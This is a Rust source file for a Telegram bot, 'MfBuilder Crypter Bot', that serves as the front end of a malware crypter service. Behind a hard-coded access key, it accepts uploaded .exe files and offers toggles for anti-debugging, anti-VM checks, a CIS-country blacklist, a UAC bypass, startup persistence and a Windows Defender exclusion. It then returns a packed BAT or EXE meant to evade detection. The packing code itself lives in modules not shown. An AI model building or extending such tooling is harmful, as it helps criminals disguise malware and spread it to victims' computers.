use teloxide::{prelude::*, utils::command::BotCommands};
use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use std::fs;
use crate::binary_arch::BinaryArch;

// Configuration for each user session
#[derive(Clone, Debug)]
pub struct UserSession {
    pub authenticated: bool,
    pub awaiting_binary: bool,
    pub awaiting_crypt_confirmation: bool,
    pub config: BuildConfig,
}

#[derive(Clone, Debug)]
pub struct BuildConfig {
    pub anti_debug: bool,
    pub anti_virtual_machine: bool,
    pub blacklist_cis_countries: bool,
    pub uac_bypass: bool,
    pub single_instance: bool,
    pub run_on_startup: bool,
    pub defender_exclusion: bool,
    pub file_extension: String,
    pub binary_path: Option<String>,
    pub binary_arch: Option<BinaryArch>,
}

impl Default for BuildConfig {
    fn default() -> Self {
        BuildConfig {
            anti_debug: false,
            anti_virtual_machine: false,
            blacklist_cis_countries: false,
            uac_bypass: false,
            single_instance: false,
            run_on_startup: false,
            defender_exclusion: false,
            file_extension: "BAT".to_string(),
            binary_path: None,
            binary_arch: None,
        }
    }
}

impl Default for UserSession {
    fn default() -> Self {
        UserSession {
            authenticated: false,
            awaiting_binary: false,
            awaiting_crypt_confirmation: false,
            config: BuildConfig::default(),
        }
    }
}

pub type Sessions = Arc<Mutex<HashMap<ChatId, UserSession>>>;

#[derive(BotCommands, Clone)]
#[command(rename_rule = "lowercase", description = "Supported commands:")]
enum Command {
    #[command(description = "Start the bot")]
    Start,
    #[command(description = "Show help")]
    Help,
    #[command(description = "Reset session")]
    Reset,
}

const VALID_KEY: &str = "MfCrypter2024"; // Change this to your desired key

pub async fn run_telegram_bot() {
    pretty_env_logger::init();
    log::info!("Starting MfBuilder Telegram Bot...");

    let bot = Bot::from_env();
    let sessions: Sessions = Arc::new(Mutex::new(HashMap::new()));

    let handler = Update::filter_message()
        .branch(
            dptree::entry()
                .filter_command::<Command>()
                .endpoint(command_handler),
        )
        .branch(
            dptree::filter(|msg: Message| msg.document().is_some())
                .endpoint(handle_document),
        )
        .branch(dptree::endpoint(message_handler));

    Dispatcher::builder(bot, handler)
        .dependencies(dptree::deps![sessions])
        .enable_ctrlc_handler()
        .build()
        .dispatch()
        .await;
}

async fn command_handler(
    bot: Bot,
    msg: Message,
    cmd: Command,
    sessions: Sessions,
) -> ResponseResult<()> {
    match cmd {
        Command::Start => {
            send_welcome_message(&bot, &msg).await?;
        }
        Command::Help => {
            bot.send_message(msg.chat.id, "?? **MfBuilder Crypter Bot**\n\n\
                Commands:\n\
                /start - Start the bot\n\
                /help - Show this help\n\
                /reset - Reset your session\n\n\
                To begin, send your authentication key.")
                .await?;
        }
        Command::Reset => {
            sessions.lock().unwrap().remove(&msg.chat.id);
            bot.send_message(msg.chat.id, "? Session reset. Send /start to begin again.")
                .await?;
        }
    }
    Ok(())
}

async fn send_welcome_message(bot: &Bot, msg: &Message) -> ResponseResult<()> {
    bot.send_message(
        msg.chat.id,
        "?? **Welcome to MfBuilder Crypter Bot**\n\n\
        Please enter your authentication key to continue:",
    )
    .await?;
    Ok(())
}

async fn message_handler(
    bot: Bot,
    msg: Message,
    sessions: Sessions,
) -> ResponseResult<()> {
    let chat_id = msg.chat.id;
    let text = msg.text().unwrap_or("");

    let mut sessions_lock = sessions.lock().unwrap();
    let session = sessions_lock.entry(chat_id).or_insert_with(UserSession::default);

    if !session.authenticated {
        // Check authentication key
        if text == VALID_KEY {
            session.authenticated = true;
            session.awaiting_crypt_confirmation = true;
            drop(sessions_lock);
            bot.send_message(chat_id, "? **Authentication successful!**\n\n\
                Do you want to crypt a binary?\n\
                Reply: **yes** or **no**")
                .await?;
        } else {
            bot.send_message(chat_id, "? Invalid key. Please try again or use /start.")
                .await?;
        }
        return Ok(());
    }

    if session.awaiting_crypt_confirmation {
        if text.to_lowercase() == "yes" {
            session.awaiting_crypt_confirmation = false;
            session.awaiting_binary = true;
            drop(sessions_lock);
            bot.send_message(
                chat_id,
                "?? **Please upload your binary (.exe file)**\n\n\
                ?? Only .exe files are supported!"
            )
            .await?;
        } else {
            drop(sessions_lock);
            bot.send_message(chat_id, "?? Operation cancelled. Send /start to begin again.")
                .await?;
        }
        return Ok(());
    }

    // Check if it's a configuration toggle
    drop(sessions_lock);
    if handle_config_toggle(bot.clone(), msg.clone(), sessions.clone(), text).await? {
        return Ok(());
    }

    Ok(())
}

async fn handle_document(
    bot: Bot,
    msg: Message,
    sessions: Sessions,
) -> ResponseResult<()> {
    let chat_id = msg.chat.id;

    let mut sessions_lock = sessions.lock().unwrap();
    let session = sessions_lock.entry(chat_id).or_insert_with(UserSession::default);

    if !session.authenticated {
        drop(sessions_lock);
        bot.send_message(chat_id, "? Please authenticate first using /start")
            .await?;
        return Ok(());
    }

    if !session.awaiting_binary {
        drop(sessions_lock);
        bot.send_message(chat_id, "? I wasn't expecting a file. Use /start to begin.")
            .await?;
        return Ok(());
    }

    let document = msg.document().unwrap();
    let file_name = document.file_name.as_ref().unwrap();

    // Check if it's an .exe file
    if !file_name.ends_with(".exe") {
        drop(sessions_lock);
        bot.send_message(chat_id, "? Only .exe files are supported!")
            .await?;
        return Ok(());
    }

    // Download the file
    let file = bot.get_file(&document.file.id).await?;
    let file_path = format!("temp_{}_{}", chat_id, file_name);
    
    let file_bytes = bot.download_file(&file.path).await?;
    fs::write(&file_path, &file_bytes)?;

    // Detect binary architecture
    let binary_arch = BinaryArch::determine(&file_bytes);
    
    if binary_arch == BinaryArch::Unknown {
        fs::remove_file(&file_path).ok();
        drop(sessions_lock);
        bot.send_message(chat_id, "? Unable to detect binary type. Please upload a valid PE executable.")
            .await?;
        return Ok(());
    }

    session.config.binary_path = Some(file_path);
    session.config.binary_arch = Some(binary_arch.clone());
    session.awaiting_binary = false;

    let arch_str = match binary_arch {
        BinaryArch::X64 => "Native x64",
        BinaryArch::X86 => "Native x86",
        BinaryArch::NET64 => ".NET x64",
        BinaryArch::NET86 => ".NET x86",
        BinaryArch::Unknown => "Unknown",
    };

    drop(sessions_lock);

    bot.send_message(
        chat_id,
        format!("? **Binary uploaded successfully!**\n\
            ?? Detected Type: **{}**\n\n\
            Now let's configure the crypter options...",
            arch_str
        )
    )
    .await?;

    // Show configuration menu
    show_config_menu(&bot, chat_id, sessions.clone()).await?;

    Ok(())
}

async fn show_config_menu(
    bot: &Bot,
    chat_id: ChatId,
    sessions: Sessions,
) -> ResponseResult<()> {
    let sessions_lock = sessions.lock().unwrap();
    let session = sessions_lock.get(&chat_id).unwrap();
    let config = &session.config;

    let menu = format!(
        "?? **Crypter Configuration**\n\n\
        1. Anti Debug: {}\n\
        2. Anti VM: {}\n\
        3. Blacklist CIS Countries: {}\n\
        4. UAC Bypass: {}\n\
        5. Single Instance: {}\n\
        6. Persistence: {}\n\
        7. Windows Defender Exclusion: {} {}\n\
        8. Output Format: **{}**\n\n\
        ?? To toggle an option, send its number (e.g., '1')\n\
        ?? To change output format, send 'format' (BAT/EXE)\n\
        ? When done, send '**build**' to create your crypted binary!",
        if config.anti_debug { "? ON" } else { "? OFF" },
        if config.anti_virtual_machine { "? ON" } else { "? OFF" },
        if config.blacklist_cis_countries { "? ON" } else { "? OFF" },
        if config.uac_bypass { "? ON" } else { "? OFF" },
        if config.single_instance { "? ON" } else { "? OFF" },
        if config.run_on_startup { "? ON" } else { "? OFF" },
        if config.defender_exclusion { "? ON" } else { "? OFF" },
        if config.uac_bypass && config.defender_exclusion { "?? (Silent with UAC!)" } else { "" },
        config.file_extension
    );

    drop(sessions_lock);
    bot.send_message(chat_id, menu).await?;
    
    Ok(())
}

// Add message handler for configuration toggles
pub async fn handle_config_toggle(
    bot: Bot,
    msg: Message,
    sessions: Sessions,
    text: &str,
) -> ResponseResult<bool> {
    let chat_id = msg.chat.id;
    
    let mut sessions_lock = sessions.lock().unwrap();
    let session = match sessions_lock.get_mut(&chat_id) {
        Some(s) if s.authenticated && s.config.binary_path.is_some() => s,
        _ => return Ok(false),
    };

    let mut updated = false;

    match text {
        "1" => {
            session.config.anti_debug = !session.config.anti_debug;
            updated = true;
        }
        "2" => {
            session.config.anti_virtual_machine = !session.config.anti_virtual_machine;
            updated = true;
        }
        "3" => {
            session.config.blacklist_cis_countries = !session.config.blacklist_cis_countries;
            updated = true;
        }
        "4" => {
            session.config.uac_bypass = !session.config.uac_bypass;
            updated = true;
        }
        "5" => {
            session.config.single_instance = !session.config.single_instance;
            updated = true;
        }
        "6" => {
            session.config.run_on_startup = !session.config.run_on_startup;
            updated = true;
        }
        "7" => {
            session.config.defender_exclusion = !session.config.defender_exclusion;
            updated = true;
        }
        "format" => {
            session.config.file_extension = if session.config.file_extension == "BAT" {
                "EXE".to_string()
            } else {
                "BAT".to_string()
            };
            updated = true;
        }
        "build" => {
            drop(sessions_lock);
            start_build_process(bot, chat_id, sessions).await?;
            return Ok(true);
        }
        _ => {}
    }

    if updated {
        drop(sessions_lock);
        show_config_menu(&bot, chat_id, sessions).await?;
    }

    Ok(updated)
}

async fn start_build_process(
    bot: Bot,
    chat_id: ChatId,
    sessions: Sessions,
) -> ResponseResult<()> {
    use crate::{MfBuilder, SupportedFileExtension, binary_arch::BinaryArch};
    use teloxide::types::InputFile;
    use std::path::Path;

    bot.send_message(chat_id, "?? **Starting build process...**\n\n\
        This may take a few moments. Please wait...")
        .await?;

    let sessions_lock = sessions.lock().unwrap();
    let session = sessions_lock.get(&chat_id).unwrap();
    let config = session.config.clone();
    drop(sessions_lock);

    if config.binary_path.is_none() || config.binary_arch.is_none() {
        bot.send_message(chat_id, "? No binary uploaded. Please start over with /start")
            .await?;
        return Ok(());
    }

    let binary_path = config.binary_path.unwrap();
    let payload_bytes = match fs::read(&binary_path) {
        Ok(bytes) => bytes,
        Err(e) => {
            bot.send_message(chat_id, format!("? Failed to read binary: {}", e))
                .await?;
            return Ok(());
        }
    };

    // Create MfBuilder configuration
    let mut build_config = MfBuilder {
        build_arch: config.binary_arch.unwrap(),
        anti_debug: config.anti_debug,
        anti_virtual_machine: config.anti_virtual_machine,
        blacklist_cis_countries: config.blacklist_cis_countries,
        uac_bypass: config.uac_bypass,
        single_instance: config.single_instance,
        run_on_startup: config.run_on_startup,
        defender_exclusion: config.defender_exclusion,
        bind_file: false,
        file_extension: SupportedFileExtension::from_str(&config.file_extension),
        payload_bytes: payload_bytes.clone(),
        binder_file_bytes: Vec::new(),
    };

    // Copy the uploaded binary to payload.exe for the builder
    if let Err(e) = fs::write("payload.exe", &payload_bytes) {
        bot.send_message(chat_id, format!("? Failed to prepare payload: {}", e))
            .await?;
        fs::remove_file(&binary_path).ok();
        return Ok(());
    }

    bot.send_message(chat_id, "?? Building crypted binary...")
        .await?;

    // Run the build process in a blocking task
    let result = tokio::task::spawn_blocking(move || {
        crate::build_with_config(build_config);
    }).await;

    // Clean up temp files
    fs::remove_file(&binary_path).ok();
    fs::remove_file("payload.exe").ok();

    if result.is_err() {
        bot.send_message(chat_id, "? Build process failed!")
            .await?;
        return Ok(());
    }

    // Determine output filename
    let output_file = if config.file_extension == "BAT" {
        "out.bat"
    } else {
        "out.exe"
    };

    // Send the built file back to user
    if Path::new(output_file).exists() {
        bot.send_message(chat_id, "? **Build completed successfully!**\n\nSending your crypted binary...")
            .await?;

        let file = InputFile::file(output_file);
        bot.send_document(chat_id, file)
            .await?;

        bot.send_message(chat_id, "?? **Done!** Your crypted binary is ready!\n\n\
            Send /start to crypt another binary.")
            .await?;

        // Clean up output file
        fs::remove_file(output_file).ok();
    } else {
        bot.send_message(chat_id, "? Build completed but output file not found!")
            .await?;
    }

    Ok(())
}
